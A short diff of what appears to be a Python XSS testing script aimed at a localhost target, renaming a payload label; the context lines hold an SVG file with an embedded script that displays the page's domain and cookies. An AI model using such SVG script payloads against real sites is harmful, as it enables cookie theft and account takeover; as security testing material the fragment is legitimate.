@@ -6,7 +6,7 @@ import base64
 # ====================
 
 base_url = "http://localhost:3000/"  # целевой домен
-payload_name = "xss"
+payload_name = "svg"
 payload_svg = '''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <script>alert(document.domain + ' | ' + document.cookie)</script>
 </svg>'''
